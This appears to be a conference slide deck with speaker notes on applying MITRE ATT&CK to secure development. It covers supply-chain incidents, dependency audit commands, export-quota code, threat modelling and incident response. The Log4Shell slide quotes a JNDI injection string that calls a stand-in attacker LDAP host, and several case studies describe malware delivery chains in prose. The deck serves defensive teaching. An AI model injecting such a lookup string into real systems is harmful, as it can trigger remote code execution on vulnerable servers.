<!-- The arc tells a single story: your dependency graph is an attack surface at every layer. event-stream is the historical setup — a tiny trusted package became a weapon after a maintainer handoff. Shai-Hulud and Axios show the modern npm threat: install equals code execution when maintainer accounts are compromised. Notepad++ proves it isn't npm-only — developer tools and their update pipelines are targets too. Log4Shell is the other failure mode: no attacker needed, a trusted library's own flaw was enough. SolarWinds and XZ Utils are the nation-state tier — years of patience, build-pipeline access, and signed artifacts that looked entirely official. -->

---

<!-- _class: compact-columns -->

## Log4Shell (2021) — Dependency-Trust Failure, Not Compromise

<div class="columns">
<div>

### 🔓 CVE-2021-44228
- **Log4j 2.0–2.14.1**: RCE via JNDI lookup injection
- Any logged string could trigger code execution:
  `${jndi:ldap://attacker.com/x}`
- Transitive dependency — most teams didn't know they had it
- CVSS 10.0 · initial fix: **Log4j 2.15.0**

</div>
<div>

### ⚠️ Why It's a Different Failure Mode
- Log4j maintainers were **not compromised**
- No poisoned release, no hijacked publisher
- A critical flaw in a **trusted, legitimate library**
- Exposed lack of Software Bill of Materials (SBOM) visibility

> A dependency can be vulnerable **without a compromised publisher.**

</div>
</div>

<!-- Log4Shell differs from SolarWinds or event-stream: there was no malicious maintainer, poisoned package, or hijacked build pipeline. The library's design had a critical flaw that attackers could exploit. Version 2.15.0 was an initial response, not a current upgrade recommendation; later fixes followed, so use current vendor guidance. The developer lesson is dependency visibility: teams first needed to answer "do we have Log4j?" A current Software Bill of Materials helps locate affected components. -->

---

<!-- _class: compact-columns -->

## Case Study: XZ Utils Backdoor (CVE-2024-3094)

<div class="columns">
<div>

### 🕵️ The 2-Year Long Con
1. **2021**: "Jia Tan" submits first patch
2. **2022**: Sock puppets pressure maintainer
3. **2023**: Becomes co-maintainer
4. **2024**: Backdoor in tarballs only
5. **Mar 29**: Found by accident

</div>
<div>

### 🎯 ATT&CK Techniques
- **T1195.001** — Supply chain compromise
- **T1098** — Maintainer takeover
- **T1027** — Obfuscation (not in git!)
- **T1059** — Remote code execution via SSHd
- 💡 Caught: SSH was **500ms slower**

</div>
</div>

<!-- The XZ incident illustrates patient abuse of maintainer trust and release packaging. The actor spent years contributing and gaining influence; the release tarballs contained malicious build-stage material that ordinary source review did not expose. Andres Freund investigated unexpected SSH performance degradation and found the backdoor. RCE means remote code execution; CVSS, the Common Vulnerability Scoring System, rated CVE-2024-3094 at 10.0. The developer takeaway is to verify the built release, not just the source changes. -->

---

<!-- _class: compact-columns -->

## Case Study: Notepad++ Update Hijack (2025)

<div class="columns">
<div>

### 🖊️ The Hijacked Update Path
1. **Jun 2025**: Hosting infrastructure compromised
2. Targeted users served trojanized `update.exe`
3. Legitimate Bitdefender binary side-loaded malicious `log.dll`
4. Shellcode decrypted → **Chrysalis** backdoor installed
5. Cobalt Strike C2 established over HTTP

</div>
<div>

### 🎯 ATT&CK Techniques
- **T1195.002** — Update infrastructure hijacked
- **T1036** — Masquerading as legitimate updater
- **T1574.002** — DLL side-loading (`log.dll`)
- **T1140** — Shellcode deobfuscation/decryption
- **T1071.001** — C2 via HTTP/HTTPS
- 💡 Fix: v8.8.9 enforced **signature verification**

</div>
</div>

<!-- The source code was clean. The GitHub repo was clean. The problem was the update delivery channel — attacker-controlled infrastructure intercepted update traffic and served trojanized NSIS installers to selected targets. Public project disclosure put the compromise at the hosting/update-infrastructure level, not the source repository. Developer tools are privileged trust anchors: if your editor's updater is hijacked, the attacker inherits the trust of your normal daily workflow. The lesson: signed source does not mean safe delivery channel. -->

---

<!-- _class: compact-columns -->

## Case Study: Axios NPM Compromise (2026)

<div class="columns">
<div>

### 📦 The 3-Hour Window
1. **Mar 31**: Maintainer account compromised via Remote Access Trojan (RAT) malware
2. `axios@1.14.1` + `axios@0.30.4` published
3. Hidden dep: `plain-crypto-js@4.2.1`
4. `postinstall` downloads **cross-platform RAT**
5. Targets secrets: cloud keys, SSH, API tokens

</div>
<div>

### 🎯 ATT&CK Techniques
- **T1195.001** — Compromised npm package
- **T1078** — Hijacked maintainer credentials
- **T1059** — RAT via postinstall script
- **T1552** — Credential harvesting
- 🇰🇵 Attributed to **Sapphire Sleet** (DPRK)
- **Package reach:** 100M+ weekly downloads

</div>
</div>

<!-- The Axios case combines maintainer-account compromise with an install-time dependency. The hidden dependency's postinstall script downloaded a platform-specific RAT targeting secrets on Windows, macOS, and Linux. The three-hour window and affected versions matter when investigating exposure. The weekly-download figure describes package reach, not a confirmed victim count. RAT means remote access Trojan. The developer takeaway is to treat dependency installation as code execution under the build identity. -->

---

## Patching Is More Than Deploying

> "It's just one CVE."

| The ticket says | The application needs |
|---|---|
| Patch the dependency | Inventory affected services |
| Restart the service | Verify the critical workflows |
| Close the ticket | Check for prior compromise |

**ATT&CK lens:** T1190 — Exploit Public-Facing Application

<!-- Speaker note: The joke is that patching is not a button. For developers, the real work is asset inventory, safe rollout, compensating controls, and post-patch detection. -->
---

<!-- _class: code-focus -->

## Dependency Controls for T1195.001

```bash
# 1. Scan known vulnerabilities and application code
npm audit --audit-level high
pip-audit && bandit -r .
dotnet list package --vulnerable --include-transitive
```

```bash
# 2. Reproduce dependencies; restrict install-time code
npm ci --omit=dev --ignore-scripts
pip install --require-hashes -r req.txt
dotnet restore --locked-mode
```

```bash
# 3. Verify signatures; inventory and scan
npm audit signatures
syft . -o spdx-json > sbom.json
grype sbom:./sbom.json
```

<!-- Three complementary controls, not proof of safe dependencies. npm audit, pip-audit, and dotnet's vulnerable-package listing check known advisories; Bandit analyzes Python code. Lockfiles and hashes reproduce selected bytes, including malicious bytes if an approved release is compromised. npm ci --ignore-scripts disables dependency lifecycle scripts during installation; --omit=dev is appropriate for a production dependency install, not every build/test job. Packages needing native builds require a narrowly reviewed build path, not blanket script re-enablement. npm audit signatures verifies supported registry signatures and provenance attestations; validate their source/build identity against your policy rather than treating a valid signature as a malware verdict. Use least-privileged isolated runners without production credentials for every ecosystem, including Python source builds. Syft writes the SBOM consumed by Grype; npm sbom --sbom-format cyclonedx is an alternative inventory command. Sources: https://docs.npmjs.com/cli/v11/commands/npm-ci/ and https://docs.npmjs.com/cli/v11/commands/npm-audit/. -->

---

## From Supply-Chain Compromise to Data Theft


<!-- This diagram is an illustrative attacker path, not the defensive build pipeline or a universal mapping. In this scenario the compromised package runs an install script (T1059), exposes credentials, and enables account abuse. Its final T1567 step means uploading collected data to a legitimate external web service controlled by the attacker; it does not mean any large response from our own API. Dependency controls address entry; runtime identity and data-access controls limit later steps. Ask where our earlier controls would interrupt this chain. -->

---

# Collection & Exfiltration

<!-- Data theft is an objective in many attacks. Assume the attacker now has a usable identity and can reach the application. A valid request can still be abusive: which data, how many records, and how much outbound volume are normal for that user? -->

---

## How Attackers Steal Your Data

| Technique ID | Name | Description |
|--------------|------|-------------|
| T1213 | Data from Information Repositories | Bulk data access |
| T1567 | Exfiltration Over Web Service | Cloud storage uploads |
| T1020 | Automated Exfiltration | Scripted data theft |

<!-- T1213 is bulk data harvesting — think SELECT * FROM customers. T1567 uses legitimate cloud services like Dropbox or Google Drive to exfiltrate data, making it hard to distinguish from normal traffic. T1020 automates the process with scripts that systematically extract and transfer data. -->

---

<!-- _class: compact-columns -->

## Real World: The Exfiltration Playbook

<div class="columns">
<div>

### 🏥 Anthem Breach (2015)
- **T1213** — Collected patient information
- **Impact** — 78.8M people affected
- **App signal** — Unusual bulk reads
- 💡 Audit data access, not just sign-ins

</div>
<div>

### 🔑 LastPass Breach (2022)
- **T1078.004** — Stolen cloud credentials
- **T1530** — Collected cloud backups
- Backup-storage keys were stolen
- Sensitive vault fields remained encrypted
- 💡 Attacker targeted **a developer's home&nbsp;PC**

</div>
</div>

<!-- These cases show why sign-in monitoring alone is not enough: an authenticated identity can read far more data than its normal work requires. Anthem affected 78.8 million people; do not confuse affected people with a verified row-count measurement from our application. LastPass disclosed that targeting a DevOps engineer enabled access to cloud backups. The stolen backup-storage decryption keys exposed stored backup contents, but sensitive customer-vault fields remained encrypted with keys derived from each user's master password. Those master passwords were not included in the stolen data; offline guessing against vaults remained a serious risk. Some other backup data, including the MFA/federation database, had separately stolen decryption keys, so distinguish those layers rather than saying the attacker had all vault keys. Collection from cloud storage is T1530; downloading those backups through their normal API is not by itself T1567. Source: https://blog.lastpass.com/posts/security-incident-update-recommended-actions. -->

---

<!-- _class: code-focus -->

## Reserve Rows Before the Query (T1213 Context)

**Example policy:** 500 rows/request; 2,000 per UTC hour.

```sql
UPDATE export_budget
SET reserved_rows = reserved_rows + :rows
WHERE tenant_id = :tenant AND subject_id = :subject
  AND hour_start = :utc_hour
  AND :rows BETWEEN 1 AND 500
  AND reserved_rows + :rows <= 2000
RETURNING :rows AS allowed_rows;
```

**No returned row → deny. Commit, then query with the approved LIMIT.**

<!-- This is an atomic check-and-reserve, not a read followed by an unprotected increment. The example is a fixed UTC-hour quota: 500 rows per request and 2,000 reserved rows per hour for one role. Fixed windows permit a boundary burst; use a correctly implemented rolling window or token bucket if the product policy requires one. On a shared transactional database, provision the current bucket with a unique (tenant_id, subject_id, hour_start) key and a nonnegative integer reserved_rows column. Bind named parameters using the driver's supported syntax; tenant and subject come from validated identity, utc_hour from the server clock, and rows must be a validated positive integer. Authorization and role selection happen first. The single conditional UPDATE serializes competing reservations of the same bucket; no returned row means deny and audit, including a missing/uninitialized bucket. It returns allowed_rows for this request, not the cumulative reserved_rows total. Commit successfully before reading data; datastore failures must fail closed and surface as operational errors. The actual data query must keep its tenant/object predicates and bind allowed_rows as its LIMIT, not merely return the count to an unbounded query. Charge admitted work even if a later step fails; refunds or approved bulk jobs require explicit, idempotent policy. Hard limits complement behavioral analytics. A quota denial is a collection/abuse signal in T1213 context, not proof of T1567 or any exfiltration channel. -->

---

<!-- _class: code-focus -->

## Reserve Bytes Before the Response

```javascript
reserveBytes(key, bytes) {
    const now = Date.now(), windowMs = 3_600_000;
    const recent = (this.tracking.get(key) ?? [])
        .filter(t => now - t.at < windowMs);
    const used = recent.reduce((sum, t) => sum + t.bytes, 0);
    if (used + bytes > 100 * 1024 * 1024) {
        this.logDenied({ key, used, attemptedBytes: bytes });
        return false;
    }
    this.tracking.set(key, [...recent, { at: now, bytes }]);
    return true;
}
```

**Denied bytes are not charged. Approved bytes are reserved.**

<!-- Single-process teaching excerpt: the constructor initializes tracking to a Map and logDenied emits the structured denial event shown earlier. The caller constructs key = JSON.stringify([tenantId, subjectId]) from validated identity, serializes the already row-bounded result once, and supplies that exact buffer's nonnegative byte length. Do not accept a client-declared size. Exactly 100 MiB is allowed; exceeding it returns false without adding the rejected bytes. A subsequent small response can still use remaining capacity. The caller must stop before writing headers or payload on false, and send the measured body unchanged on true. These are admitted-byte reservations, not proof of successful delivery; aborted sends remain charged under this conservative policy. Unlike the previous fixed-hour row example, this byte example uses a rolling hour. Within one Node process the check and update do not yield; production replicas require shared atomic storage and expiration, not separate Maps. Streamed exports need chunk reservations before each write. Keep denied attempts in audit telemetry, not in the transferred/reserved counter. This is an application collection/abuse limit; T1567 requires evidence of an external web-service exfiltration channel. -->

---

## Data Flow Monitoring


<!-- Keep the two decisions distinct. Authenticate and authorize the tenant/resource first, then atomically reserve the row allowance before executing the bounded query. Serialize that bounded result and reserve its actual byte size before sending anything. Either budget can deny and emit an audit event without releasing the payload. Approved reservations stay charged under the conservative policy in these examples; denied candidates are not charged. Request-rate controls can run before this flow, and the SIEM can correlate these events with behavioral and IdP signals. -->

---

# Practical Implementation

<!-- Now apply the same questions in the development workflow: what can an attacker do to this feature, what can we observe, and what response should follow? Start with identity, sessions, and data access rather than trying to cover the entire matrix. -->

---

## ATT&CK-Informed Threat Modeling


<!-- This is your threat modeling loop. For every feature, ask: what ATT&CK techniques could target this? Then design detections, implement them, and test. The loop is continuous — as new techniques are added to ATT&CK, revisit your features. This is a shift from reactive patching to proactive defense design. -->

---

## Map Features to Techniques

| Application Feature | ATT&CK Techniques | Example Risk |
|---------------------|------------------|------------|
| User Login | T1078 Valid Accounts, T1110 Brute Force, T1566 Phishing | High |
| Password Reset | T1566 Phishing, T1078 Valid Accounts | High |
| Session Management | T1539 Cookie Theft, T1550.004 Cookie Replay | High |
| File Upload | T1505.003 Web Shell, T1190 Exploit Public-Facing App | High |
| API Endpoints | T1087 Account Discovery, T1046 Network Scanning | Medium |
| Data Export | T1213 Repository Collection, T1530 Cloud Storage Collection | High |
| Logging System | T1070 Indicator Removal, T1027 Obfuscation | Medium |
| Dependencies | T1195 Supply Chain, T1195.001 Compromise Dependencies | Medium |

<!-- This is a starting-point worksheet, not a universal risk ranking or a one-to-one mapping from weakness to technique. User login raises credential-attack scenarios; session theft and replay are distinct; file upload can enable a web shell if server configuration permits execution. Export endpoints expose collection opportunities. T1567 requires an external web-service exfiltration path, while T1020 requires evidence of automated exfiltration; neither is established by a large response alone. Adjust hypotheses and risk labels for your exposure, privileges, data sensitivity and existing controls. Dependencies can be critical even though this illustrative table labels them Medium. -->

---

## Building Detection Into Code

### Key Patterns:

- **Authorization Checks**: Verify the subject against the specific object
- **Technique Logging**: Tag events with ATT&CK IDs for correlation
- **Adaptive Controls**: Integrate supported IdP signals and step-up
- **Honey Tokens**: Fake data/accounts to detect unauthorized access
- **Protected Auditing**: Off-host retention, restricted deletion, delivery alerts

<!-- Use framework or policy-engine authorization with your application's resource rules. Structured events provide technique context for SIEM correlation without declaring every denial a confirmed attack. Adaptive controls use the provider's documented claims, risk APIs and challenge protocol; acr/amr values and risk exposure are not universal, and the app must verify that a requested step-up actually completed. Honey tokens can add high-signal evidence when deliberately designed and monitored. Protected auditing needs storage and operational controls beyond serializing or exporting a record. -->

---

## Detection Maturity: A Brief Evolution


**ATT&CK lens:** T1071 — Application Layer Protocol

<!-- The maturity curve moves from isolated log searches to alerts, correlated techniques, and behavioral context. These are complementary capabilities, not replacements for each other. Improve one useful signal and its response before adding more detection complexity. -->
---

## Defense in Depth Architecture




<!-- Prevention combines supported identity controls, resource authorization, safe interpreter APIs and bounded data access. Detection joins application audit context with IdP and endpoint signals rather than rebuilding all their analytics inside the app. Response requires tested session revocation, workload containment and preservation of evidence. These capabilities complement one another; a threshold breach is a policy decision to investigate, not an automatic attribution. -->

---

## OWASP + ATT&CK Integration



<!-- OWASP guidance helps identify weaknesses and design secure code; ATT&CK supplies observed adversary behaviors for threat scenarios, abuse-case tests and detection hypotheses. Combine both in one engineering workflow: prevent with controls and tests, detect with application events and cross-system correlation, and respond with practiced containment and recovery. Neither framework is itself a scanner or a guarantee of coverage. Feed incidents and test results back into the next design review. -->

---

## Implementation Roadmap

<div class="columns3">
<div>

### Phase 1: Foundation
- Map features to ATT&CK techniques
- Secure logging with technique IDs
- Basic behavioral analytics

</div>
<div>

### Phase 2: Detection
- Anomaly detection for high-risk techniques
- Automated response workflows
- Security Information and Event Management (SIEM) integration

</div>
<div>

### Phase 3: Advanced
- Honey tokens and deception
- Threat intelligence correlation
- Security dashboards

</div>
</div>

<!-- Don't try to boil the ocean. Phase 1 is mapping and logging — understand what you're defending and make sure you can see what's happening. Phase 2 adds active detection and automated response. Phase 3 adds advanced capabilities like deception and threat intelligence. Each phase builds on the last. -->

---

## When the Alert Is Real

```text
SIEM:  T1071 beacon pattern from build agent
IdP:   risky sign-in signal for the same identity
API:   30x normal export volume
Team:  correlate, triage, contain
```

| Step | Action |
|---|---|
| Triage | Confirm signal and scope blast radius |
| Contain | Revoke token, isolate runner, stop export |
| Preserve | Protect logs and capture evidence |
| Recover | Patch path, rotate secrets, write detection |

**ATT&CK lens:** T1071 — Application Layer Protocol


<!-- This is the response handoff: detection only matters if the team knows the first moves. The practical lesson is to predefine containment and evidence-preservation actions for high-risk ATT&CK-tagged alerts. -->
---

<!-- _class: compact-columns -->

## Team Adoption & Tooling

<div class="columns">
<div>

### Adoption Strategies
- **Training**: ATT&CK workshops for dev teams
- **Process**: Technique IDs in security requirements
- **Culture**: "Red team thinking" in design reviews
- **Metrics**: Track technique coverage rates
- **Collaboration**: Regular dev ↔ security syncs

</div>
<div>

### ATT&CK Navigator
- **Tool**: [attack-navigator](https://mitre-attack.github.io/attack-navigator/)
- Visualize technique coverage and gaps
- Color-code: 🟢 defended / 🟡 partial / 🔴 gap
- Communicate risk to stakeholders
- Plan security improvements

</div>
</div>

<!-- Security culture is as important as security code. Train your team on ATT&CK, include technique IDs in your Jira tickets, and encourage "red team thinking" in design reviews. The ATT&CK Navigator is a free tool for visualizing your coverage — a visual heat map of your security posture is worth a thousand bullet points. Ask: "If I were an attacker, how would I abuse this feature?" -->

---

## Start Small - Pick Your Top 3

### Start with application-owned policies:
1. **T1078 (Valid Accounts)** - Object + tenant authorization
2. **T1213 (Data from Repositories)** - Export limits on your data
3. **T1059 / T1190 (Injection)** - Input boundaries to interpreters

### Why these first:
- **Use framework support; define your rules**
- **Relatively easy** to implement
- **Immediate value** for detection
- **Foundation** for expanding coverage

<!-- Start with these application policies while configuring the identity provider's supported credential-attack and risk protections. Frameworks, gateways and policy services can implement much of the mechanism; your team defines the resource rules, integrations and tests. Object and tenant authorization limits what an authenticated identity can reach. Export budgets limit admitted work and data release. Safe input APIs keep data separate from interpreters. Keep useful behavioral monitoring and consume provider signals rather than asserting that every custom detection is inherently wrong. Test app-session revocation alongside the IdP's own lifecycle controls. -->

---

<style scoped>
table { font-size: 0.78em; line-height: 1.2; }
blockquote { font-size: 0.9em; margin: 0.5em 0; }
p { margin: 0.35em 0; }
</style>

### How It Started vs How It's Going


| How it started 😎 | How it's going 😱 |
|---|---|
| `// TODO: add auth later` | `[CRITICAL] T1190 - SQLi in production` |
| `// TODO: rotate this API key` | `[CRITICAL] T1552 - API key on GitHub` |
| `// TODO: add rate limiting` | `[CRITICAL] T1110 - 50K login attempts/hr` |
| `// TODO: check dependencies` | `[CRITICAL] T1195 - Malicious dependency` |

> Every "TODO: fix later" is an attacker's "TODO: exploit now"

**ATT&CK lens:** T1190 — Exploit Public-Facing Application

<!-- Security TODOs can leave opportunities for attackers. Use ATT&CK to prioritize the ones relevant to your application's exposure and likely attack paths. This is a reminder to act on the three priorities from the previous slide, not an instruction to fix every possible technique at once. -->
---

## Key Takeaways

- ✅ **OWASP + ATT&CK = Better-Informed Defense** - Prevention + Detection
- ✅ **Think Like an Attacker** - Understand adversary behavior patterns
- ✅ **Build Detection Into Code** - Monitoring isn't just ops responsibility
- ✅ **Log ATT&CK Technique IDs** - Enable security team correlation
- ✅ **Reuse IdP Protections** - Configure, integrate, and test app enforcement
- ✅ **Start Small, Iterate** - Pick 3 techniques and expand coverage

<!-- If you remember nothing else: OWASP and ATT&CK are complementary, not competing, and neither guarantees complete security. Identify likely attacker behavior, instrument the relevant signals, and define a response. Configure the identity provider for credential attacks, and spend your own effort on authorization, export limits, and input boundaries — the controls that stay broken until a developer fixes them. Revisit the crooked-line visual: we do not need to predict every move to make that path harder and more observable. -->

---

# Questions?


[Slides & samples](https://github.com/codebytes/mitre-attack-for-devs)

<!-- Thank you! I'm happy to take questions. If we run out of time, catch me in the hallway or reach out on BlueSky or LinkedIn. -->

---

# Tell Me How I Did

- **What landed?**
- **Where should I go deeper?**
- **What should I trim?**

<!-- Your feedback shapes the next revision of this deck. Share what worked, what didn't, and where you'd like me to focus next time, either in person or through the contact links on the next slide. -->
---

<div class="columns">
<div>

## Links

- **[MITRE ATT&CK Framework](https://attack.mitre.org/)** - Main knowledge base
- **[ATT&CK Enterprise Matrix](https://attack.mitre.org/matrices/enterprise/)** - Technique matrix
- **[ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)** - Coverage visualization
- **[OWASP Developer Guide](https://owasp.org/www-project-developer-guide/)** - Secure development
- **[D3FEND](https://d3fend.mitre.org/)** - Defensive countermeasures

</div>
<div>

## Chris Ayers

<i class="fa-brands fa-bluesky"></i> BlueSky: [@chris-ayers.com](https://bsky.app/profile/chris-ayers.com)
<i class="fa-brands fa-linkedin"></i> LinkedIn: [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
<i class="fa fa-window-maximize"></i> Blog: [https://chris-ayers\.com/](https://chris-ayers.com/)
<i class="fa-brands fa-github"></i> GitHub: [Codebytes](https://github.com/codebytes)
<i class="fa-brands fa-mastodon"></i> Mastodon: [@Chrisayers@hachyderm.io](https://hachyderm.io/@Chrisayers)

</div>
</div>

<!-- Here are resources to continue your journey. The ATT&CK framework site and Navigator are your primary tools. D3FEND is MITRE's companion project that maps defensive countermeasures to techniques. And please reach out — I love talking about this stuff. -->
